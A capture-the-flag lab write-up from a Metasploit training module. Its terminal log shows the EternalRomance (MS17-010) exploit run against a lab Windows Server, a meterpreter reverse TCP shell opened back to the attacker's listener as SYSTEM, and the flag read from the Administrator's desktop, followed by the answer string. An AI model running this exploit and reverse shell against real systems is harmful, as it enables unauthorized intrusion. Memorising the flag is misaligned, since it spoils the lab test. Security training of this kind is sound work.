# Section 04: Modules

Module: 09. Using the Metasploit Framework

---

## Questions & Answers

### 1. Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.

Context:
```
msfconsole
[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name               Current Setting    Required  Description
   ----               ---------------    --------  -----------
   DBGTRACE           false              yes       Show extra debug trace info
   LEAKATTEMPTS       99                 yes       How many times to try to le
                                                   ak transaction
   NAMEDPIPE                             no        A named pipe that can be co
                                                   nnected to (leave blank for
                                                    auto)
   NAMED_PIPES        /usr/share/metasp  yes       List of named pipes to chec
                      loit-framework/da            k
                      ta/wordlists/name
                      d_pipes.txt
   RHOSTS                                yes       The target host(s), see htt
                                                   ps://docs.metasploit.com/do
                                                   cs/using-metasploit/basics/
                                                   using-metasploit.html
   RPORT              445                yes       The Target port (TCP)
   SERVICE_DESCRIPTI                     no        Service description to be u
   ON                                              sed on target for pretty li
                                                   sting
   SERVICE_DISPLAY_N                     no        The service display name
   AME
   SERVICE_NAME                          no        The service name
   SHARE              ADMIN$             yes       The share to connect to, ca
                                                   n be an admin share (ADMIN$
                                                   ,C$,...) or a normal read/w
                                                   rite folder share
   SMBDomain          .                  no        The Windows domain to use f
                                                   or authentication
   SMBPass                               no        The password for the specif
                                                   ied username
   SMBUser                               no        The username to authenticat
                                                   e as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     213.163.207.235  yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.15.113
LHOST => 10.10.15.113
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set RHOSTS 10.129.150.154
RHOSTS => 10.129.150.154
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run
[*] Started reverse TCP handler on 10.10.15.113:4444 
[*] 10.129.150.154:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.150.154:445 - Built a write-what-where primitive...
[+] 10.129.150.154:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.150.154:445 - Selecting PowerShell target
[*] 10.129.150.154:445 - Executing the payload...
[+] 10.129.150.154:445 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> optinos
[-] Unknown command: optinos. Did you mean options? Run the help command for more details.
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name               Current Setting    Required  Description
   ----               ---------------    --------  -----------
   DBGTRACE           false              yes       Show extra debug trace info
   LEAKATTEMPTS       99                 yes       How many times to try to le
                                                   ak transaction
   NAMEDPIPE                             no        A named pipe that can be co
                                                   nnected to (leave blank for
                                                    auto)
   NAMED_PIPES        /usr/share/metasp  yes       List of named pipes to chec
                      loit-framework/da            k
                      ta/wordlists/name
                      d_pipes.txt
   RHOSTS             10.129.150.154     yes       The target host(s), see htt
                                                   ps://docs.metasploit.com/do
                                                   cs/using-metasploit/basics/
                                                   using-metasploit.html
   RPORT              445                yes       The Target port (TCP)
   SERVICE_DESCRIPTI                     no        Service description to be u
   ON                                              sed on target for pretty li
                                                   sting
   SERVICE_DISPLAY_N                     no        The service display name
   AME
   SERVICE_NAME                          no        The service name
   SHARE              ADMIN$             yes       The share to connect to, ca
                                                   n be an admin share (ADMIN$
                                                   ,C$,...) or a normal read/w
                                                   rite folder share
   SMBDomain          .                  no        The Windows domain to use f
                                                   or authentication
   SMBPass                               no        The password for the specif
                                                   ied username
   SMBUser                               no        The username to authenticat
                                                   e as


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     10.10.15.113     yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run
[*] Started reverse TCP handler on 10.10.15.113:4444 
[*] 10.129.150.154:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.150.154:445 - Built a write-what-where primitive...
[+] 10.129.150.154:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.150.154:445 - Selecting PowerShell target
[*] 10.129.150.154:445 - Executing the payload...
[+] 10.129.150.154:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (232006 bytes) to 10.129.150.154
[*] Meterpreter session 1 opened (10.10.15.113:4444 -> 10.129.150.154:49672) at 2026-07-31 02:31:44 -0400

(Meterpreter 1)(C:\Windows\system32) > shell
Process 2856 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir C:\Administrator
dir C:\Administrator
 Volume in drive C has no label.
 Volume Serial Number is 9850-1131

 Directory of C:\

File Not Found

C:\Windows\system32>dir C:\
dir C:\
 Volume in drive C has no label.
 Volume Serial Number is 9850-1131

 Directory of C:\

10/05/2020  06:43 PM    <DIR>          inetpub
07/16/2016  06:23 AM    <DIR>          PerfLogs
05/16/2022  05:08 AM    <DIR>          Program Files
05/16/2022  05:08 AM    <DIR>          Program Files (x86)
10/05/2020  06:51 PM    <DIR>          Users
10/05/2020  06:43 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  30,872,817,664 bytes free

C:\Windows\system32>dir C:\Users
dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is 9850-1131

 Directory of C:\Users

10/05/2020  06:51 PM    <DIR>          .
10/05/2020  06:51 PM    <DIR>          ..
10/05/2020  06:51 PM    <DIR>          .NET v2.0
10/05/2020  06:51 PM    <DIR>          .NET v2.0 Classic
10/05/2020  06:51 PM    <DIR>          .NET v4.5
10/05/2020  06:51 PM    <DIR>          .NET v4.5 Classic
10/05/2020  04:18 PM    <DIR>          Administrator
10/05/2020  06:51 PM    <DIR>          Classic .NET AppPool
11/20/2016  06:24 PM    <DIR>          Public
               0 File(s)              0 bytes
               9 Dir(s)  30,872,817,664 bytes free

C:\Windows\system32>dir C:\Users\Administrator
dir C:\Users\Administrator
 Volume in drive C has no label.
 Volume Serial Number is 9850-1131

 Directory of C:\Users\Administrator

10/05/2020  04:18 PM    <DIR>          .
10/05/2020  04:18 PM    <DIR>          ..
10/05/2020  04:18 PM    <DIR>          Contacts
05/16/2022  05:17 AM    <DIR>          Desktop
10/05/2020  04:18 PM    <DIR>          Documents
10/05/2020  07:08 PM    <DIR>          Downloads
10/05/2020  04:18 PM    <DIR>          Favorites
10/05/2020  04:18 PM    <DIR>          Links
10/05/2020  04:18 PM    <DIR>          Music
10/05/2020  04:18 PM    <DIR>          Pictures
10/05/2020  04:18 PM    <DIR>          Saved Games
10/05/2020  04:18 PM    <DIR>          Searches
10/05/2020  04:18 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  30,872,817,664 bytes free

C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\Desktop\flag.txt
HTB{MSF-W1nD0w5-3xPL01t4t10n}
C:\Windows\system32>
```

**Answer:** `HTB{MSF-W1nD0w5-3xPL01t4t10n}`

---

[Back to Module Index](./README.md)
